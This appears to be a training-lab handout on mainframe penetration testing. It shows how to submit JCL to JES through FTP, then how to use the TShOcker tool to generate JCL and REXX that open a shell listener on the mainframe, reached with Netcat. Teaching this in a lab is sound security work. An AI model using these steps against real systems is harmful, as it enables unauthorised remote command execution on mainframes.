Lab 07: Use FTP to execute JCL

- Connect to the mainframe with FTP
- Issue the FTP command: SITE FILE=JES
- Upload your JCL
- Record the JOBnnnnn where nnnnn is a number
- List to see if the job ran
- Download the job results (GET JOBnnnnn.X)

Use this code and download the results. You have to put in your own job card. 
You can copy/paste that from a previous example. Make sure the jobcard is your
userid followed by a letter. Just one letter. 

//<<JOBCARD>>
//SEARCH  EXEC PGM=ISRSUPC,
//            PARM='SRCHCMP,ANYC'
//NEWDD  DD DISP=SHR,DSN=EVIL.JCL
//OUTDD  DD SYSOUT=*
//SYSIN  DD *
SRCHFOR  'You'

Using JCL and REXX and FTP Execute some code. You can use TShocker to make the JCL for you. It include a rexx script called 'CATSO.rexx'. Or feel free to write your own REXX script.

TShOcker:

./TShOcker.py -p PORT -l --lport "<choose a port>" --print IP USERNAME PASSWORD > ./JCL_REXX

--print means 'Print the JCL'
PORT = Mainframe Port
--lport is the listening port you want
IP = Mainframe IP/Hostname
USERNAME/PASSWORD = Username and Password

Then connect with Netcat on the port you selected for --lport
